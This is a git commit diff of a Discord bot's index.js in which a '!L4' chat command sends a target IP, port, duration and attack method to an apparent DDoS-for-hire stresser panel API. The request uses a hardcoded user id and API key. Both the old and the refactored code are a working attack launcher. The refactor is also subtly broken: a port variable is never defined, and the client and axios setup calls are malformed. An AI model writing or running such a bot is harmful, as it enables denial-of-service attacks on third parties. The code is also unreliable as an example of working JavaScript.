e010ec838633752d40f12980918e93e581939acd
ivopc <ivoopc@gmail.com>
2021-12-26 16:06:48 -0300

    Problem solved

--- index.js
+++ index.js
@@ -1,25 +1,25 @@
-const ms = require('ms')
-const fetch = require('node-fetch')
-const axios = require('axios')
-const Discord = require('discord.js')
-const client = new Discord.Client()
-const config = require('./config.json')
-const { MessageButton, MessageActionRow } = require('discord-buttons')
+const ms = require('ms');
+const client = new require('discord.js').Client();
+const config = require('./config.json');
+const { MessageButton, MessageActionRow } = require('discord-buttons');
 const disbut = require('discord-buttons');
 disbut(client);
 
-client.once('ready', () => {
+const api = require('axios').create('http://zdstresser.net/panel/apiv1/');
+
+async function onReady () {
     console.log('Lets Fucking GO!');
-});
+};
 
-client.on('message', async (message) => {
+async function onMessage (message) {
+    if(message.content.startsWith(`!L4`)) {
+        const [, alvo, tempo, metodo ] = message.content.split(" ");
+        const { response: { data } } = await api.post(`/?userid=16410&key=74YB7-97327-RKBLS&command=post.attack&type=ip4&target=${alvo}&port=${porta}&time=${tempo}&method=id::${metodo}`);
+        console.log(data);
+    };
+};
 
-    if(message.content.startsWith(`!L4 ${alvo} ${porta} ${tempo} ${metodo}`)){
-        axios.post(`http://zdstresser.net/panel/apiv1/?userid=16410&key=74YB7-97327-RKBLS&command=post.attack&type=ip4&target=${alvo}&port=${porta}&time=${tempo}&method=id::${metodo}`).then(function(resposta){
-            console.log(resposta.data);
-        });
-    }
+client.once('ready', onReady);
+client.on('message', onMessage);
 
-});
-
-client.login(config.token)
+client.login(config.token);
